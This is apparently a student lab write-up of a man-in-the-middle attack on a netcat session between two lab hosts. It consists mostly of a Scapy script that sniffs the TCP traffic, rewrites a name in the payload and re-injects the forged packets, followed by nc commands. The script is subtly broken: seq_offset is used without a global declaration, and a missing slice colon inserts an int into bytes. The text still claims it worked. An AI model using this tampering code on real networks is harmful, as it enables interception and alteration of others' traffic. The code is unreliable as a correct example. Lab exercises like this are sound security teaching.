## MITM Attack Against Netcat
This task is to replace every occurrence of my first name in a netcat connection between hosts A and B the with a sequence of A’s. We can use a slightly modified version of task 3's MITM scapy script:
```python3
#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"
seq_offset = 0

def spoof_pkt(pkt):
    if IP in pkt and TCP in pkt:
        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
            # Create a new packet based on the captured one.
            L3 = IP(src=pkt[IP].src, dst=pkt[IP].dst)
            L4 = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags=pkt[TCP].flags, seq=pkt[TCP].seq + seq_offset, ack=pkt[TCP].ack)
            # Construct the new payload based on the old payload.
            if pkt[TCP].payload:
                data = pkt[TCP].payload.load # The original payload data
                if b"daniel" in data.lower().split():
                    idx = data.lower().find(b"daniel")
                    newdata = data[:idx] + b"AAAAAA" + data[idx + len(b"daniel")]
                    print(f"replaced {data} with {newdata}")
                    seq_offset += len(newdata) - len(data)
                    data = newdata
                newpkt = L3/L4/data
                del(newpkt.chksum)
                del(newpkt[TCP].chksum)
                send(newpkt)
            else:
                send(pkt[IP])

#we only want to spoof packets between hosts A and B, so isolate their respective addresses
f = f'tcp and (ether src {MAC_A} or ether src {MAC_B})'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
```

Let's start up the netcat server on host B and connect from host A. Then we run our script on host M and see what happens to our message
```shell
root@9cd27edc87ad:/# nc -lp 9090

root@ef3a05ea874d:/# nc 10.9.0.6 9090
mmy name is daniel hello
```
![image](https://github.com/user-attachments/assets/40b1c21f-97fc-4da8-8e63-9b5bebca23f7)

Would you look at that! It replaced my name with A's!
